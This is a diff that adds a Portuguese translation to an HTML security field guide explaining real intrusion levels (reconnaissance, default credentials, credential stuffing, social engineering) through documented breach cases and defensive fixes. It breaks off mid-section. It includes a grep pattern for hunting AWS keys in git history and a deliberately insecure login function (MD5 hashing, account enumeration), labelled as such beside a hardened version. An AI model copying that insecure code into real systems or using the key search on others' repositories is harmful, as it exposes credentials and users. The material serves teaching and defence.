@@ -362,6 +362,10 @@ footer .disclaimer b{color:var(--warn)}
   html{scroll-behavior:auto}
   *{animation:none !important;transition:none !important}
 }
+.lang-switch{display:flex;gap:8px;justify-content:flex-end;padding:8px 16px;background:#0b0f14;font-family:var(--mono,monospace);font-size:13px;border-bottom:1px solid #223}
+.lang-switch a{color:#c9d6e3;text-decoration:none;border:1px solid #3a4756;padding:3px 10px}
+.lang-switch a[aria-current="true"]{background:#f85149;border-color:#f85149;color:#fff}
+@media print{.lang-switch{display:none!important}}
 </style>
 
     <link rel="canonical" href="https://blog.odicforcesounds.com/Security.html">
@@ -450,6 +454,12 @@ footer .disclaimer b{color:var(--warn)}
   </script>
 </head>
 <body>
+<nav class="lang-switch" aria-label="Language">
+  <a href="?lang=pt" data-lang-switch="pt" lang="pt-PT">Português</a>
+  <a href="?lang=en" data-lang-switch="en" aria-current="true" lang="en">English</a>
+</nav>
+
+<div id="lang-en" data-lang-block="en">
 <div class="shell">
 
 <header class="masthead">
@@ -1987,5 +1997,1567 @@ FREQ_SETPOINT := <span class="n">1064</span>;   <span class="c">// commanded dri
 </main>
 </div>
 </div>
+</div>
+
+<div id="lang-pt" data-lang-block="pt" hidden>
+<div class="shell">
+
+<header class="masthead">
+  <span class="eyebrow"><span class="pulse"></span> Guia de campo de segurança · enquadramento defensivo</span>
+  <h2 class="seo-h2">Como o hacking <span class="glitch">acontece</span> de verdade.</h2>
+  <p class="lede">
+    Os filmes mostram uma figura encapuzada, um terminal verde e quinze segundos de teclado que abrem um banco.
+    A realidade é mais aborrecida e muito mais eficaz: uma porta destrancada, uma palavra-passe roubada, um servidor
+    sem correcções de que ninguém se lembrava estar virado para a internet. Este guia percorre os oito níveis da
+    técnica de intrusão real, com um caso documentado, uma amostra de código e a defesa que o teria travado em cada um.
+  </p>
+  <div class="byline">
+    <span>8 níveis de técnica</span>
+    <span>Casos documentados</span>
+    <span>Mapeado ao MITRE ATT&amp;CK</span>
+    <span>Cada afirmação com fonte</span>
+  </div>
+
+  <div class="stats">
+    <div class="stat g"><b>~60%</b><span>das violações envolveram um elemento humano <small>(Verizon DBIR 2025)</small></span></div>
+    <div class="stat r"><b>44%</b><span>das violações envolveram ransomware, +37% face ao ano anterior <small>(DBIR 2025)</small></span></div>
+    <div class="stat y"><b>30%</b><span>das violações envolveram um terceiro — o dobro do ano anterior <small>(DBIR 2025)</small></span></div>
+    <div class="stat p"><b>20%</b><span>usaram a exploração de uma vulnerabilidade para entrar, +34% face ao ano anterior <small>(DBIR 2025)</small></span></div>
+    <div class="stat c"><b>115 mil $</b><span>resgate mediano realmente pago; 64% das vítimas recusaram pagar <small>(DBIR 2025)</small></span></div>
+  </div>
+</header>
+
+<div class="layout">
+
+<nav class="toc" aria-label="Índice">
+  <h2>Índice</h2>
+  <ol>
+    <li><a href="#pt-real">Realidade vs. filmes</a></li>
+    <li><a href="#pt-ladder">A escada, num relance</a></li>
+  </ol>
+  <p class="grp">Os oito níveis</p>
+  <ol>
+    <li><a href="#pt-l0">0 · Reconhecimento</a></li>
+    <li><a href="#pt-l1">1 · Credenciais por omissão</a></li>
+    <li><a href="#pt-l2">2 · Reutilização de palavras-passe</a></li>
+    <li><a href="#pt-l3">3 · Engenharia social</a></li>
+    <li><a href="#pt-l4">4 · Explorar um serviço</a></li>
+    <li><a href="#pt-l5">5 · Escalar e mover</a></li>
+    <li><a href="#pt-l6">6 · Persistir e exfiltrar</a></li>
+    <li><a href="#pt-l7">7 · Impacto e pagamento</a></li>
+    <li><a href="#pt-l8">8 · Estado-nação</a></li>
+  </ol>
+  <p class="grp">Síntese</p>
+  <ol>
+    <li><a href="#pt-anatomy">Anatomia de uma campanha</a></li>
+    <li><a href="#pt-defense">Defesas que aguentam</a></li>
+    <li><a href="#pt-refs">Fontes e referências</a></li>
+    <li><a href="index.html">Página inicial</a></li>
+  </ol>
+</nav>
+
+<main>
+
+<section id="pt-real">
+  <h2 class="big">Realidade vs. filmes <span class="kicker">Comece aqui</span></h2>
+  <p class="deck">
+    As intrusões reais não são feitiços. São uma sequência de passos banais, cada um barato, cada um evitável.
+    A indústria tem um vocabulário comum para esses passos — o MITRE ATT&amp;CK, que actualmente cataloga
+    <strong>15 tácticas, 227 técnicas e 479 sub-técnicas</strong> só para ambientes empresariais
+    <a href="#ref-1-pt">[1]</a><a href="#ref-2-pt">[2]</a>. Esta página segue essa forma, nível a nível.
+  </p>
+
+  <div class="myths">
+    <div class="myth">
+      <span class="m">Mito: os hackers quebram a criptografia</span>
+      <p>A criptografia moderna não é o ponto fraco. Eles entram com a palavra-passe válida de alguém.</p>
+      <span class="r">Realidade</span>
+      <p><strong>Contas válidas</strong> e <strong>credenciais roubadas</strong> repetem-se em quase todos os casos
+      abaixo. Nas intrusões à Snowflake em 2024, <em>todos</em> os incidentes investigados remontavam a credenciais
+      de clientes comprometidas <a href="#ref-37-pt">[37]</a>.</p>
+    </div>
+    <div class="myth">
+      <span class="m">Mito: é preciso um génio</span>
+      <p>As ferramentas de ataque estão mercantilizadas, vendidas por subscrição, e muitas vezes operadas por quem
+      entende mal o negócio e nada das ferramentas.</p>
+      <span class="r">Realidade</span>
+      <p>A intrusão à MGM Resorts não foi ganha com uma exploração. Foi ganha convencendo um help desk a repor uma
+      palavra-passe <a href="#ref-19-pt">[19]</a>. A comunicação da vítima situou o impacto em cerca de
+      <strong>100 milhões de dólares</strong> <a href="#ref-18-pt">[18]</a>.</p>
+    </div>
+    <div class="myth">
+      <span class="m">Mito: são precisos zero-days</span>
+      <p>Os zero-days são munição carapartilhada. A maioria das intrusões usa uma vulnerabilidade que o fabricante
+      corrigiu há meses — ou vulnerabilidade nenhuma.</p>
+      <span class="r">Realidade</span>
+      <p>A Change Healthcare em 2024 não foi um ataque novo: um sistema simplesmente
+      <strong>não usava autenticação multifactor</strong> <a href="#ref-20-pt">[20]</a>.</p>
+    </div>
+    <div class="myth">
+      <span class="m">Mito: acaba em segundos</span>
+      <p>O tempo de permanência é longo. O SUNBURST, a backdoor do SolarWinds, esperou deliberadamente cerca de
+      duas semanas antes de sequer telefonar a casa.</p>
+      <span class="r">Realidade</span>
+      <p>A detecção raramente falha porque o atacante foi rápido. Falha porque ninguém estava a olhar para os
+      registos que já diziam o que tinha acontecido.</p>
+    </div>
+  </div>
+</section>
+
+<section id="pt-ladder">
+  <h2 class="big">A escada, num relance</h2>
+  <p class="deck">
+    Os níveis 0–4 são sobre <em>entrar</em>. Os níveis 5–6 são sobre <em>ficar dentro e circular</em>.
+    Os níveis 7–8 são sobre <em>quanto vale o acesso</em>. Um atacante raramente precisa dos oito — a maioria
+    das intrusões termina no nível 2 ou 3 e ainda assim funciona.
+  </p>
+  <div class="tablewrap">
+    <table>
+      <thead>
+        <tr><th>Nível</th><th>O que significa realmente</th><th>Âncora ATT&amp;CK</th><th>Custo para o atacante</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>0 · Recon</td><td>Ler o que o alvo publicou: serviços, pessoal, segredos, versões de software</td><td>TA0043</td><td>Quase zero</td></tr>
+        <tr><td>1 · Credenciais por omissão</td><td>Entrar num dispositivo que ainda usa a palavra-passe de fábrica</td><td>T1078, T1110</td><td>Quase zero</td></tr>
+        <tr><td>2 · Reutilização</td><td>Tentar aqui palavras-passe roubadas noutras violações</td><td>T1110.004</td><td>Muito baixo</td></tr>
+        <tr><td>3 · Engenharia social</td><td>Convencer uma pessoa a entregar o acesso ou a aprovar um pedido</td><td>T1566, T1078</td><td>Baixo, escala</td></tr>
+        <tr><td>4 · Explorar um serviço</td><td>Abusar de uma falha de software em algo alcançável pela internet</td><td>T1190</td><td>Baixo a alto</td></tr>
+        <tr><td>5 · Escalar e mover</td><td>Transformar um ponto de apoio em controlo de todo o domínio, em silêncio</td><td>T1003, T1550.002</td><td>Moderado</td></tr>
+        <tr><td>6 · Persistir e exfiltrar</td><td>Telefonar a casa em intervalos regulares, misturar-se com o tráfego normal, levar os dados</td><td>T1071, T1219</td><td>Moderado</td></tr>
+        <tr><td>7 · Impacto</td><td>Cifrar, divulgar, vender, extorquir ou cometer fraude</td><td>TA0040</td><td>Baixo depois de entrar</td></tr>
+        <tr><td>8 · Estado-nação</td><td>Código na cadeia de fornecimento, zero-days feitos à medida, travessia de air-gaps</td><td>T1195, T1190</td><td>Muito alto</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="callout info">
+    <p><b>Leia a escada como um orçamento.</b> Cada degrau é uma troca: sofisticação custa dinheiro e atrai atenções;
+    uma porta destrancada não custa nada e muitas vezes serve. É por isso que os degraus aborrecidos — 1, 2 e 3 —
+    carregam a maioria das intrusões reais, e que o exótico degrau 8 fica com as manchetes.</p>
+  </div>
+</section>
+
+<section id="pt-l0">
+  <h2 class="big">Nível 0 · Reconhecimento</h2>
+
+  <div class="level" style="--c:#8d9aab">
+    <div class="level-head">
+      <span class="num">0</span>
+      <div>
+        <h3>Ver o que deixou virado para a internet</h3>
+        <p class="tactic">MITRE ATT&amp;CK <b>TA0043 Reconnaissance</b> · O “hacking” começa a ler, não a quebrar.</p>
+      </div>
+    </div>
+    <p>
+      Antes de se atacar qualquer coisa, mede-se. As gamas de IP públicas são sondadas e indexadas
+      continuamente: que máquinas, que portas, que versões de software. Os subdomínios escapam-se nos registos
+      de transparência de certificados. Os anúncios de emprego nomeiam os produtos exactos que uma empresa usa.
+      Os repositórios de código revelam muito mais do que código — por vezes credenciais activas.
+    </p>
+    <p>
+      Nada disto é ilegal na maioria das jurisdições, e tudo isto é automatizado. A pergunta real do atacante
+      neste nível é simples: <strong>o que está exposto e quem consegue entrar nisso?</strong>
+    </p>
+
+    <div class="case">
+      <h4><span class="tag case-tag">Caso</span> Uber, 2016 — a chave que estava no Git</h4>
+      <p>
+        A cadeia de acesso por trás da violação da Uber em 2016 é uma ilustração perfeita dos níveis 0, 2 e 3
+        empilhados. Segundo a Comissão Federal de Comércio dos EUA, um engenheiro tinha colocado uma
+        <strong>chave de acesso AWS em texto simples dentro de um repositório privado do GitHub</strong>, e os
+        intrusos chegaram a esses repositórios com palavras-passe de engenheiros
+        <strong>expostas noutras grandes violações de dados</strong> — a Uber não exigia MFA para acesso aos
+        repositórios nem proibia a reutilização de palavras-passe <a href="#ref-25-pt">[25]</a>.
+      </p>
+      <ul class="facts">
+        <li>Os números da FTC: ao longo de um mês, os intrusos descarregaram <b>25,6 milhões de nomes e endereços de email</b>, <b>22,1 milhões de nomes e números de telemóvel</b> e <b>607 mil números de carta de condução</b> <a href="#ref-25-pt">[25]</a>.</li>
+        <li>O Procurador-Geral da Califórnia descreveu a exposição como dados de <b>57 milhões de utilizadores</b>; a Uber viria a acordar em todo o país o pagamento de <b>148 milhões de dólares</b> pela violação e pela divulgação tardia <a href="#ref-26-pt">[26]</a>.</li>
+        <li>Dois controlos banais — MFA obrigatório no alojamento de código e nunca guardar chaves de longa duração num repositório — teriam cada um quebrado a cadeia.</li>
+      </ul>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+        <span class="fname">caça-a-segredos — como se vê uma fuga de repositório por fora</span><span class="lang">bash</span></div>
+<pre><code><span class="c"># Um comando sobre todo o histórico de um repositório, incluindo ficheiros apagados.</span>
+<span class="c"># (Estes dois valores são exemplos da documentação pública da própria AWS.)</span>
+$ git log -p --all | grep -nE <span class="s">'AKIA[0-9A-Z]{16}'</span>
+<span class="bad">+aws_access_key_id = AKIAIOSFODNN7EXAMPLE</span>
+<span class="bad">+aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY</span>
+
+<span class="c"># Os commits apagados não são apagados. O histórico é a superfície da fuga.</span>
+$ git log --all --oneline -- .env
+<span class="n">4f9a1c2</span> rotate keys
+<span class="n">a03bb77</span> initial commit   <span class="c">&lt;-- o segredo continua a viver aqui</span></code></pre>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot g"></span><span class="fname">a correcção — eliminar a chave de longa duração</span><span class="lang">ini</span></div>
+<pre><code><span class="c"># ~/.aws/config — nenhum segredo guardado para ser roubado.</span>
+[default]
+region = us-east-1
+<span class="v">credential_process = aws-sso-credential-process</span>
+<span class="c"># Ou, em CI, uma identidade de carga de trabalho OIDC que gera credenciais</span>
+<span class="c"># de curta duração por tarefa. Nada duradouro para escapar, nada para rodar.</span></code></pre>
+    </div>
+
+    <details class="deep">
+      <summary>Porque “repositório privado” não é um controlo de segurança</summary>
+      <div class="body">
+        <p>
+          Um repositório privado é uma decisão de autorização tomada por um fornecedor, a proteger um segredo que
+          não controla, atrás de uma palavra-passe que um humano escolheu e pode reutilizar. É um factor. Assim que
+          um atacante tem uma sessão de engenheiro válida — como no caso da Uber — privado e público ficam iguais.
+          Trate cada repositório como eventualmente público e cada chave como eventualmente divulgada: é por isso que
+          credenciais de curta duração e âmbito limitado valem mais do que as duradouras, onde quer que estejam.
+        </p>
+      </div>
+    </details>
+
+    <div class="defense">
+      <h4>O que o trava</h4>
+      <ul>
+        <li><b>Detecção de segredos no pipeline</b> e no histórico — apanhar a chave antes de um humano a esquecer.</li>
+        <li><b>Nenhuma chave de nuvem duradoura.</b> SSO, OIDC e identidade de carga de trabalho: nada durável para roubar.</li>
+        <li><b>Reduzir a superfície na internet.</b> Inventariar o que está realmente alcançável; matar endpoints esquecidos e ambientes de teste.</li>
+        <li><b>MFA obrigatório no alojamento de código</b> — só isto quebrou a cadeia da Uber no primeiro passo.</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section id="pt-l1">
+  <h2 class="big">Nível 1 · A porta da frente destrancada</h2>
+
+  <div class="level" style="--c:#56d4dd">
+    <div class="level-head">
+      <span class="num">1</span>
+      <div>
+        <h3>Dispositivos que ainda usam a palavra-passe de fábrica</h3>
+        <p class="tactic">MITRE ATT&amp;CK <b>T1078 Valid Accounts</b> · <b>T1110 Brute Force</b> · Credenciais por omissão e fracas</p>
+      </div>
+    </div>
+    <p>
+      A intrusão mais barata possível: um dispositivo que sai da caixa com <code>admin/admin</code>, que nunca é
+      alterado, e que está alcançável pela internet numa porta administrativa. Sem exploração, sem engenho —
+      apenas um formulário de entrada deixado como o fabricante o desenhou.
+    </p>
+
+    <div class="case">
+      <h4><span class="tag case-tag">Caso</span> Mirai, 2016 — 62 palavras-passe por omissão, uma botnet</h4>
+      <p>
+        O Mirai sondava a internet continuamente à procura de dispositivos da internet das coisas — routers, câmaras,
+        gravadores — e entrava com <strong>uma lista de 62 nomes de utilizador e palavras-passe comuns por
+        omissão</strong>. Cada dispositivo comprometido juntava-se a uma botnet usada para ataques de negação de
+        serviço distribuída. A CISA aconselhou os defensores a vigiar as portas Telnet <strong>23 e 2323</strong>
+        para tentativas de acesso não autorizado <a href="#ref-29-pt">[29]</a>.
+      </p>
+      <ul class="facts">
+        <li>A CISA atribuiu ao Mirai um ataque DDoS superior a <b>620 Gbps</b> contra o KrebsOnSecurity, e um ataque Mirai separado à OVH de pelo menos <b>1,1 Tbps</b> <a href="#ref-29-pt">[29]</a>.</li>
+        <li>A CISA citou a alegação do autor do Mirai de mais de <b>380 mil dispositivos IoT</b> alistados para o ataque ao Krebs <a href="#ref-29-pt">[29]</a>.</li>
+        <li>O Mirai foi também associado à queda da Dyn DNS em Outubro de 2016, que tornou grandes sites inacessíveis por instantes para muitos utilizadores; o texto do SEI descreve o papel do Mirai com cautela, como um factor entre vários <a href="#ref-30-pt">[30]</a>.</li>
+        <li>Nenhum CVE foi necessário para o mecanismo original. A fraqueza era uma credencial por omissão conhecida, numa porta exposta.</li>
+      </ul>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot y"></span><span class="fname">/var/log/auth.log — a forma do ataque, do lado do defensor</span><span class="lang">text</span></div>
+<pre><code><span class="c">$ grep -E 'Failed password|Invalid user' /var/log/auth.log | tail -6</span>
+Oct 16 03:14:02 host sshd[2919]: Invalid user <span class="bad">admin</span> from <span class="bad">185.203.16.77</span> port 51422
+Oct 16 03:14:03 host sshd[2921]: Failed password for invalid user <span class="bad">admin</span> from 185.203.16.77 port 51438
+Oct 16 03:14:04 host sshd[2923]: Invalid user <span class="bad">root</span> from 185.203.16.77 port 51451
+Oct 16 03:14:05 host sshd[2925]: Failed password for invalid user <span class="bad">root</span> from 185.203.16.77 port 51466
+Oct 16 03:14:06 host sshd[2927]: Invalid user <span class="bad">pi</span> from 185.203.16.77 port 51479
+Oct 16 03:14:07 host sshd[2929]: Failed password for invalid user <span class="bad">pi</span> from 185.203.16.77 port 51491
+
+<span class="c"># Ordenar as fontes por volume de falhas de autenticação. (A posição do</span>
+<span class="c"># campo varia com o formato, por isso fixe-a com um parser em produção.)</span>
+<span class="c">$ grep 'Failed password' /var/log/auth.log \</span>
+    | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -3
+<span class="n">  4182</span> 185.203.16.77      <span class="c">&lt;-- bloquear esta origem e investigar</span>
+<span class="n">    91</span> 91.240.118.4
+<span class="n">    12</span> 172.16.4.19        <span class="c">&lt;-- interno, palavra-passe errada: falar com o utilizador</span></code></pre>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot g"></span><span class="fname">a correcção — tornar o valor por omissão impossível e inalcançável</span><span class="lang">jsonc</span></div>
+<pre><code><span class="c">// O remédio é deliberadamente aborrecido, e é por isso que fica por fazer.</span>
+{
+  <span class="a">"device"</span>: <span class="s">"camera-fw-4.2"</span>,
+  <span class="a">"change_on_first_boot"</span>: [<span class="s">"admin"</span>],   <span class="c">// imposto na instalação, não sugerido</span>
+  <span class="a">"telnet"</span>: { <span class="a">"enabled"</span>: <span class="k">false</span> },      <span class="c">// a porta de que o Mirai precisava</span>
+  <span class="a">"mgmt_interface"</span>: <span class="s">"vlan-99"</span>,          <span class="c">// alcançável só pela rede de gestão</span>
+  <span class="a">"egress_policy"</span>: <span class="s">"deny-by-default"</span>     <span class="c">// uma câmara comprometida não pode sair</span>
+}</code></pre>
+    </div>
+
+    <div class="defense">
+      <h4>O que o trava</h4>
+      <ul>
+        <li><b>Alterar os valores por omissão no acolhimento</b>, num processo que falha se o passo for saltado.</li>
+        <li><b>Desligar o que não usa:</b> Telnet, UPnP, pontes para a nuvem do fabricante, portas de depuração.</li>
+        <li><b>Segmentar a classe de dispositivo.</b> Câmaras e impressoras não devem chegar à VLAN das finanças nem à internet livremente.</li>
+        <li><b>Limitar a taxa e alertar sobre falhas de autenticação</b> por origem, e bloquear ou atrasar acima do limite.</li>
+        <li><b>Inventariar o que não tem dono.</b> A maioria das vítimas de credenciais por omissão são dispositivos que ninguém sabe ter.</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section id="pt-l2">
+  <h2 class="big">Nível 2 · Reutilização de palavras-passe e credential stuffing</h2>
+
+  <div class="level" style="--c:#58a6ff">
+    <div class="level-head">
+      <span class="num">2</span>
+      <div>
+        <h3>A sua palavra-passe era válida aqui porque era válida noutro sítio</h3>
+        <p class="tactic">MITRE ATT&amp;CK <b>T1110.004 Credential Stuffing</b> · <b>T1078 Valid Accounts</b> · <b>T1555 Credentials from Password Stores</b></p>
+      </div>
+    </div>
+    <p>
+      O credential stuffing pega em pares utilizador/palavra-passe fugidos de um serviço e experimenta-os noutro,
+      explorando o facto de as pessoas reutilizarem palavras-passe. O MITRE descreve a técnica como obter acesso
+      por “<em>sobreposição de credenciais</em>” — utilizadores que reutilizam palavras-passe entre contas pessoais
+      e profissionais <a href="#ref-36-pt">[36]</a>.
+    </p>
+    <p>
+      Acrescente malware infostealer, que colhe credenciais e dados de sessão guardados na própria máquina da vítima
+      e os envia para um mercado, e o atacante nem precisa de quebrar nada. Está simplesmente a entrar como um
+      funcionário.
+    </p>
+
+    <div class="case">
+      <h4><span class="tag case-tag">Caso</span> A campanha Snowflake de 2024 — AT&amp;T, Ticketmaster, Santander</h4>
+      <p>
+        Este é o exemplo de referência do nível 2 em escala. A Mandiant seguiu o actor com motivação financeira como
+        <strong>UNC5537</strong> e relatou que <strong>todos os incidentes investigados remontavam a credenciais de
+        clientes comprometidas</strong>, sem indícios de que a actividade viesse de uma violação do ambiente da
+        própria Snowflake. As credenciais tinham sido previamente roubadas por malware infostealer em sistemas que
+        não eram da Snowflake; <strong>pelo menos 79,7%</strong> das contas usadas pelo actor tinham exposição
+        prévia de credenciais. Nos incidentes analisados, o MFA não estava activo, credenciais válidas por vezes
+        ficaram anos sem rotação e faltavam listas de permissões de rede. A Mandiant e a Snowflake notificaram
+        aproximadamente <strong>165 organizações potencialmente expostas</strong> <a href="#ref-37-pt">[37]</a>.
+      </p>
+      <ul class="facts">
+        <li>A <b>AT&amp;T</b> comunicou à SEC que um atacante acedeu a um espaço de trabalho numa plataforma de nuvem de terceiros e exfiltrou ficheiros entre <b>14 e 25 de Abril de 2024</b>. Os dados abrangiam registos de chamadas e de interacções por SMS de cerca de <b>Maio a Outubro de 2022</b> e um dia de Janeiro de 2023, e a comunicação diz que cobria <b>“quase todos os clientes sem fios da AT&amp;T”</b>. A comunicação em si não indica um total numérico <a href="#ref-38-pt">[38]</a>. O valor amplamente citado de cerca de <b>109 milhões de contas de clientes nos EUA</b> vem da imprensa da época e descreve contas, não registos individuais de chamadas <a href="#ref-39-pt">[39]</a><a href="#ref-40-pt">[40]</a>.</li>
+        <li>A <b>Ticketmaster</b> confirmou “actividade não autorizada numa base de dados isolada na nuvem alojada por um fornecedor terceiro de serviços de dados” e <em>não</em> nomeou o fornecedor nem confirmou o valor de 560 milhões tantas vezes repetido <a href="#ref-41-pt">[41]</a>.</li>
+        <li>O <b>Santander</b> confirmou acesso não autorizado a uma base de dados alojada por terceiros que afectou certos clientes no Chile, em Espanha e no Uruguai, afirmando que nessa base não estavam credenciais que permitissem transacções <a href="#ref-42-pt">[42]</a>.</li>
+      </ul>
+    </div>
+
+    <div class="case">
+      <h4><span class="tag case-tag">Caso</span> 23andMe, 2023 — 14 mil entradas, 6,9 milhões de perfis</h4>
+      <p>
+        Uma lição útil sobre ler números de violações com cuidado. A 23andMe disse que um actor acedeu a um número
+        seleccionado de contas individuais usando <strong>credential stuffing — credenciais reutilizadas de outros
+        sites comprometidos</strong>. O valor confirmado era de cerca de <strong>14 mil contas</strong>, menos de
+        0,1% dos clientes. Através dessas contas, o actor chegou a aproximadamente <strong>5,5 milhões de perfis de
+        DNA Relatives</strong> e <strong>1,4 milhões de perfis de Family Tree</strong> — cerca de
+        <strong>6,9 milhões de perfis no total</strong>, o que não é o mesmo que 6,9 milhões de entradas
+        comprometidas <a href="#ref-43-pt">[43]</a>.
+      </p>
+      <ul class="facts">
+        <li>Catorze mil palavras-passe reutilizadas produziram uma manchete sobre quase sete milhões de pessoas: <b>o raio de destruição de uma entrada é cada outra conta que ela consegue ver</b>.</li>
+        <li>Medição do fornecedor sobre o comportamento subjacente: a SpyCloud reportou uma <b>taxa de reutilização de 74%</b> entre utilizadores expostos em duas ou mais violações no ano anterior, e uma <b>taxa histórica de 61%</b> para palavras-passe previamente expostas até 2023. Descrevem a população analisada pela SpyCloud, não um inquérito a todos os utilizadores da internet <a href="#ref-44-pt">[44]</a><a href="#ref-45-pt">[45]</a>.</li>
+      </ul>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot r"></span><span class="fname">login.py — a versão que alimenta o credential stuffing</span><span class="lang">python</span></div>
+<pre><code><span class="c"># ✖ Hash rápido, sem limite de taxa, erros detalhados, sem portão de MFA.</span>
+<span class="k">import</span> hashlib
+
+<span class="k">def</span> <span class="f">login</span>(db, email, password):
+    row = db.execute(
+        <span class="s">"SELECT pw_hash FROM users WHERE email = ?"</span>, (email,)
+    ).fetchone()
+    <span class="k">if</span> row <span class="k">is</span> <span class="k">None</span>:
+        <span class="bad">return</span> <span class="s">"No account with that email"</span>   <span class="c"># enumeração: diz ao atacante quem existe</span>
+    <span class="k">if</span> row[<span class="s">"pw_hash"</span>] == hashlib.md5(password.encode()).hexdigest():
+        <span class="bad">return</span> <span class="s">"ok"</span>                            <span class="c"># MD5: milhares de milhões de palpites por segundo numa GPU</span>
+    <span class="bad">return</span> <span class="s">"Wrong password"</span>                     <span class="c"># e nada limita a frequência com que isto corre</span></code></pre>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot g"></span><span class="fname">login.py — endurecido exactamente contra este ataque</span><span class="lang">python</span></div>
+<pre><code><span class="c"># ✓ Hash com custo de memória, limite por origem, respostas uniformes, continuação com MFA.</span>
+<span class="k">from</span> argon2 <span class="k">import</span> PasswordHasher
+<span class="k">from</span> argon2.exceptions <span class="k">import</span> VerifyMismatchError
+
+ph = PasswordHasher()
+
+<span class="k">def</span> <span class="f">login</span>(db, cache, email, password, ip, device):
+    <span class="c"># 1. Limitar por origem *e* por conta: o stuffing espalha uma conta</span>
+    <span class="c">#    por milhares de IPs, e milhares de contas por um IP.</span>
+    <span class="k">for</span> key <span class="k">in</span> (<span class="s">f"rl:ip:{ip}"</span>, <span class="s">f"rl:acct:{email}"</span>):
+        <span class="k">if</span> cache.incr(key) == <span class="n">1</span>:
+            cache.expire(key, <span class="n">900</span>)
+        <span class="k">if</span> <span class="f">int</span>(cache.get(key) <span class="k">or</span> <span class="n">0</span>) &gt; <span class="n">10</span>:
+            <span class="k">return</span> <span class="f">generic_failure</span>()           <span class="c"># mesma forma que uma palavra-passe errada</span>
+
+    row = db.execute(
+        <span class="s">"SELECT id, pw_hash, totp_secret FROM users WHERE email = ?"</span>, (email,)
+    ).fetchone()
+
+    <span class="k">try</span>:
+        <span class="k">if</span> row <span class="k">and</span> ph.verify(row[<span class="s">"pw_hash"</span>], password):
+            <span class="k">if</span> ph.check_needs_rehash(row[<span class="s">"pw_hash"</span>]):
+                db.execute(<span class="s">"UPDATE users SET pw_hash = ? WHERE id = ?"</span>,
+                           (ph.hash(password), row[<span class="s">"id"</span>]))
+            <span class="k">return</span> <span class="f">require_mfa</span>(row[<span class="s">"id"</span>], device)  <span class="c"># a palavra-passe sozinha não é uma sessão</span>
+    <span class="k">except</span> VerifyMismatchError:
+        <span class="k">pass</span>
+
+    <span class="k">return</span> <span class="f">generic_failure</span>()                    <span class="c"># sem enumeração, sem detalhe, sem oráculo</span></code></pre>
+    </div>
+
+    <div class="callout warn">
+      <p><b>A linha do MFA é a defesa inteira.</b> Na campanha Snowflake, as credenciais eram válidas mas o MFA
+      simplesmente não estava activo, e nalguns casos a mesma credencial ficou anos sem rotação
+      <a href="#ref-37-pt">[37]</a>. Uma palavra-passe roubada mais um segundo factor que o atacante não tem é
+      apenas uma entrada falhada.</p>
+    </div>
+
+    <div class="defense">
+      <h4>O que o trava</h4>
+      <ul>
+        <li><b>MFA em todo o lado, depois resistente a phishing</b> (ver nível 3) — derrota as palavras-passe roubadas por completo.</li>
+        <li><b>Argon2id ou bcrypt</b> no armazenamento, para que um hash roubado não seja uma quebra offline barata.</li>
+        <li><b>Verificar as palavras-passe contra bases de violações</b> ao defini-las e ao entrar — uma palavra-passe reutilizada é uma palavra-passe conhecida.</li>
+        <li><b>Limitar por conta e por IP</b>, com mensagens de erro uniformes para evitar enumeração de contas.</li>
+        <li><b>Rodar e limitar as credenciais de serviço</b>, e definir listas de permissões de rede onde o fornecedor o suporte.</li>
+        <li><b>Assumir a máquina comprometida.</b> Os infostealers tornam o roubo de credenciais trivial; endurecer o endpoint também é um controlo de credenciais.</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section id="pt-l3">
+  <h2 class="big">Nível 3 · Engenharia social</h2>
+
+  <div class="level" style="--c:#bc8cff">
+    <div class="level-head">
+      <span class="num">3</span>
+      <div>
+        <h3>Atacar as pessoas que legitimamente têm acesso</h3>
+        <p class="tactic">MITRE ATT&amp;CK <b>T1566 Phishing</b> · <b>T1078 Valid Accounts</b> · Fadiga de MFA / personificação do help desk</p>
+      </div>
+    </div>
+    <p>
+      A engenharia social não é uma forma menor de hacking; é a de maior rendimento, porque ataca o componente
+      mais difícil de corrigir e mais disposto a ajudar. Três variantes dominam os incidentes reais:
+    </p>
+    <ul>
+      <li><strong>Phishing</strong> — uma mensagem que convence uma pessoa a introduzir credenciais numa página que o atacante controla, ou a abrir um anexo.</li>
+      <li><strong>Fadiga de MFA / push bombing</strong> — o atacante já tem a palavra-passe e dispara repetidamente pedidos de aprovação até a vítima aprovar um por irritação ou confusão.</li>
+      <li><strong>Personificação do help desk</strong> — o atacante liga ao serviço de apoio como funcionário e pede a reposição da palavra-passe ou o registo de um novo autenticador.</li>
+    </ul>
+
+    <div class="case">
+      <h4><span class="tag case-tag">Caso</span> MGM Resorts, 2023 — um help desk, não uma exploração</h4>
+      <p>
+        A imprensa atribui a intrusão ao grupo <strong>Scattered Spider</strong>, por engenharia social ao help desk.
+        O aviso da CISA sobre o grupo descreve precisamente esta táctica: convencer o pessoal de apoio a repor
+        palavras-passe ou a reemitir tokens MFA. A comunicação da própria MGM à SEC <em>não</em> indica o método de
+        acesso inicial nem nomeia os actores, por isso a sequência específica de personificação é atribuição
+        jornalística e não confirmação da empresa <a href="#ref-18-pt">[18]</a><a href="#ref-19-pt">[19]</a>.
+      </p>
+      <ul class="facts">
+        <li>A MGM estimou um impacto negativo de aproximadamente <b>100 milhões de dólares</b> no Adjusted Property EBITDAR e reportou <b>menos de 10 milhões</b> em despesas pontuais naquele momento <a href="#ref-18-pt">[18]</a>.</li>
+        <li>A comunicação diz que foram obtidos dados pessoais de alguns clientes que tinham transaccionado antes de <b>Março de 2019</b>, e que dados bancários e de cartões de pagamento <em>não</em> foram obtidos <a href="#ref-18-pt">[18]</a>.</li>
+        <li>Sem CVE. Nada foi explorado — foi explorado o processo de recuperação de conta.</li>
+      </ul>
+    </div>
+
+    <div class="case">
